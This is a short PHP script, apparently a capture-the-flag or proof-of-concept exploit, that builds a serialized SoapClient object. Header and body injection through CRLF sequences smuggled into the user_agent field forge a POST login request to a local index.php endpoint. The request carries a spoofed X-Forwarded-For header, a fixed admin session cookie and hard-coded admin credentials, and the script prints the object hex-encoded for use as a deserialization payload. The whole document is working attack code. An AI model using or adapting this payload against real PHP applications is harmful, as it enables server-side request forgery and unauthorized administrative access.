<?php
$target = "http://127.0.0.1/index.php?action=login";
$post_string = "username=admin&password=nu1ladmin&code=McOuUGt8";  // change code
$headers = array(
    "X-Forwarded-For: 127.0.0.1",
    "Cookie: PHPSESSID=thisisadmin"
);
$b = new SoapClient(null,array(
    'location'   => $target,
    'user_agent' => "test\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n", $headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
    'uri'        => "test"
));

$poc = serialize($b);
echo bin2hex($poc);